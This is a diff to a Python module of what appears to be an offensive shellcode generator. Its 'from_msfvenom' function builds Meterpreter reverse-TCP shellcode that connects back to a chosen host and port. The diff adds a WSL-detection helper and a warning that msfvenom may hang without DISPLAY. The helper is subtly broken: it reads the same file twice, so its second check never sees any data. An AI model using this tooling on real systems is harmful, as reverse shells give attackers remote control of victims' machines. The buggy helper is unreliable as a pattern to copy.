@@ -1,7 +1,18 @@
+import os
 import re
 import subprocess
 import sys
 from pathlib import Path
+
+
+def _is_wsl():
+    if 'microsoft' in os.uname().release.lower():
+        return True
+    try:
+        with open('/proc/sys/kernel/osrelease') as f:
+            return 'WSL' in f.read() or 'microsoft' in f.read().lower()
+    except OSError:
+        return False
 
 
 def from_file(path):
@@ -43,7 +54,9 @@ def from_msfvenom(lhost, lport, payload='windows/x64/meterpreter/reverse_tcp',
         '-f', 'raw', '--quiet'
     ]
     print(f'[*] generating shellcode: {payload} -> {lhost}:{lport}', file=sys.stderr)
-    # FIXME: msfvenom on WSL2 hangs without X forwarding -- add env check
+    if _is_wsl() and not os.environ.get('DISPLAY'):
+        print('[!] WSL detected without DISPLAY; msfvenom may hang.', file=sys.stderr)
+        print('    set DISPLAY=:0 with WSLg, or supply prebuilt shellcode via -i', file=sys.stderr)
     try:
         r = subprocess.run(cmd, capture_output=True, timeout=30)
     except FileNotFoundError:
